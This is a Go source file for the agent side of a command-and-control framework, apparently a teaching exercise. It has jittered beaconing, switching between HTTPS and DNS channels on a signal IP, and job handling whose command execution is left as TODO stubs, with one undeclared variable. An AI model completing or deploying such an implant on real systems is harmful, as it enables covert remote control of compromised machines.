package agent

import (
	"context"
	"encoding/json"
	"log"
	"math/rand"
	"time"

	"c2framework/internals/config"
	"c2framework/internals/server"
)

// CalculateSleepDuration calculates the actual sleep time with jitter
func CalculateSleepDuration(baseDelay time.Duration, jitterPercent int) time.Duration {
	if jitterPercent == 0 {
		return baseDelay
	}

	// Calculate jitter range
	jitterRange := float64(baseDelay) * float64(jitterPercent) / 100.0

	// Random value between -jitterRange and +jitterRange
	jitter := (rand.Float64()*2 - 1) * jitterRange

	// Calculate final duration
	finalDuration := float64(baseDelay) + jitter

	// Ensure we don't go negative
	if finalDuration < 0 {
		finalDuration = 0
	}

	return time.Duration(finalDuration)
}

// detectTransition checks if the response indicates we should switch protocols
func detectTransition(protocol string, response json.RawMessage) bool {
	switch protocol {
	case "https":
		var httpsResp server.HTTPSResponse
		if err := json.Unmarshal(response, &httpsResp); err != nil {
			return false
		}
		return httpsResp.Change

	case "dns":
		// DNS response is now JSON with "ip" field
		var dnsResp struct {
			IP string `json:"ip"`
		}
		if err := json.Unmarshal(response, &dnsResp); err != nil {
			return false
		}
		return dnsResp.IP == "69.69.69.69"
	}

	return false
}

// RunLoop runs the agent communication loop
func RunLoop(ctx context.Context, comm Agent, cfg *config.AgentConfig) error {
	// Track current state
	currentProtocol := cfg.Protocol // Track which protocol we're using
	currentAgent := comm            // Track current agent (can change!)

	for {
		// Check if context is cancelled
		select {
		case <-ctx.Done():
			log.Println("Run loop cancelled")
			return nil
		default:
		}

		response, err := currentAgent.Send(ctx)
		if err != nil {
			log.Printf("Error sending request: %v", err)
			// Don't exit - just sleep and try again
			time.Sleep(cfg.Timing.Delay)
			continue // Skip to next iteration
		}

		// Check if there is a job (in case of HTTPS)
		if currentProtocol == "https" {
			// TODO: create httpsResp of type server.HTTPSResponse

			if err := json.Unmarshal(response, &httpsResp); err != nil {
				log.Printf("Error unmarshaling HTTPS response: %v", err)
			} else {
				if httpsResp.Job {
					log.Printf("Job received from Server\n-> Command: %s\n-> JobID: %s", httpsResp.Command, httpsResp.JobID)
					// Type assert to *HTTPSAgent to access ExecuteTask
					if httpsAgent, ok := currentAgent.(*HTTPSAgent); ok {
						// TODO: call httpsAgent.ExecuteTask()
					}
				} else {
					log.Printf("No job from Server")
				}
			}
		}

		// Check if this is a transition signal
		if detectTransition(currentProtocol, response) {
			log.Printf("TRANSITION SIGNAL DETECTED! Switching protocols...")

			// Figure out what protocol to switch TO
			newProtocol := "dns"
			if currentProtocol == "dns" {
				newProtocol = "https"
			}

			// Create config for new protocol
			tempConfig := *cfg // Copy the config
			tempConfig.Protocol = newProtocol

			// Try to create new agent
			newAgent, err := NewAgent(&tempConfig)
			if err != nil {
				log.Printf("Failed to create %s agent: %v", newProtocol, err)
				// Don't switch if we can't create agent
			} else {
				// Update our tracking variables
				log.Printf("Successfully switched from %s to %s", currentProtocol, newProtocol)
				currentProtocol = newProtocol
				currentAgent = newAgent
			}
		} else {
			// Normal response - parse and log as before
			switch currentProtocol { // Note: use currentProtocol, not cfg.Protocol
			case "https":
				var httpsResp server.HTTPSResponse
				json.Unmarshal(response, &httpsResp)
				log.Printf("Received response: change=%v", httpsResp.Change)
			case "dns":
				// DNS response is now JSON with "ip" field
				var dnsResp struct {
					IP string `json:"ip"`
				}
				json.Unmarshal(response, &dnsResp)
				log.Printf("Received response: IP=%v", dnsResp.IP)
			}
		}

		// Calculate sleep duration with jitter
		sleepDuration := CalculateSleepDuration(cfg.Timing.Delay, cfg.Timing.Jitter)
		log.Printf("Sleeping for %v", sleepDuration)

		// Sleep with cancellation support
		select {
		case <-time.After(sleepDuration):
			// Continue to next iteration
		case <-ctx.Done():
			log.Println("Run loop cancelled")
			return nil
		}
	}
}
